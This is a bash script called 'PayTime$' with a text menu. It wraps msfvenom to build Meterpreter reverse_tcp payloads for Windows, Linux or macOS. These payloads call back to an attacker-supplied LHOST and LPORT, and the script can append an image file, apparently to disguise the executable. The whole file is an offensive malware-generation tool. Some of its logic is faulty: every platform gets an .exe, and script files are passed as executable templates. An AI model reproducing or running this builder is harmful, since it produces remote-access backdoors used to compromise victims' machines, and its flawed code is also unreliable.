#!/bin/bash
cat << "EOF"
_____              _______ _                 _
|  __ \            |__   __(_)               | |
| |__) |_ _ _   _     | |   _ _ __ ___   ___ | |
|  ___/ _` | | | |    | |  | | '_ ` _ \ / _ \| |
| |  | (_| | |_| |    | |  | | | | | | |  __/|_|
|_|   \__,_|\__, |    |_|  |_|_| |_| |_|\___|(_)
              __/ |          _|_
             |___/          | $ |
EOF

function show_menu() {
    echo "============================="
    echo "         PayTime$            "
    echo "============================="
    echo "1. Generate Windows Payload"
    echo "2. Generate Linux Payload"
    echo "3. Generate macOS Payload"
    echo "4. Exit"
    echo ""
}

function generate_payload() {
    read -p "Enter LHOST (your IP address): " LHOST
    read -p "Enter LPORT (your listening port): " LPORT
    read -p "Enter output filename (without extension): " FILENAME
    
    read -p "Enter your custom script file path (leave empty if none): " CUSTOM_SCRIPT
    read -p "Enter the image file path (leave empty if none): " IMAGE_FILE
    
    if [[ -f "$CUSTOM_SCRIPT" ]]; then
        # Check the file type and select appropriate command
        case "$CUSTOM_SCRIPT" in
            *.sh) 
                SCRIPT_TYPE="bash"
                ;;
            *.ps1)
                SCRIPT_TYPE="powershell"
                ;;
            *.bat)
                SCRIPT_TYPE="batch"
                ;;
            *)
                echo "Unsupported script type. Continuing without custom script."
                SCRIPT_TYPE=""
                ;;
        esac
    else
        SCRIPT_TYPE=""
    fi

    case $OS_OPTION in
        1) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
        2) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
        3) PAYLOAD="osx/x64/meterpreter/reverse_tcp" ;;
        *) echo "Invalid option. Exiting."; exit 1 ;;
    esac

    echo "Generating payload..."
    
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe -o "${FILENAME}.exe" -x "$CUSTOM_SCRIPT"
    
    if [ $? -ne 0 ]; then
        echo "Failed to create the payload."
        return
    fi

    if [[ -f "$IMAGE_FILE" ]]; then
        
        cat "$IMAGE_FILE" >> "${FILENAME}.exe"
        echo "Image added to payload: ${IMAGE_FILE}"
    fi

    echo "Payload created successfully: ${FILENAME}.exe"
    read -p "Press any key to continue..."
}

while true; do
    show_menu
    read -p "Select an option (1-4): " OS_OPTION
    
    case $OS_OPTION in
        1|2|3) generate_payload ;;
        4) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid option. Please try again." ;;
    esac
done
